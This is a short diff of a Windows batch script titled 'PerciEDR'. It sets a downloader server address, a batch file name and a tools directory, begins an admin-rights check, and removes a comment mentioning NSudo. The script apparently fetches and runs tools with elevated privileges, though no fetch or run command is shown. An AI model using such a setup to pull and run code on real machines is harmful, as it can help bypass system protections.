@@ -1,10 +1,9 @@
 @echo off
 
-title Perci 
+title PerciEDR
 
-rem change srv information and Nsudo.exe name hosted in your srv
 set downloaderserver="10.10.10.10:8000"
-set downloadername=Downloader.bat
+set downloadername="Downloader.bat"
 set directory="C:\Supertools"
 
 net session >nul 2>&1
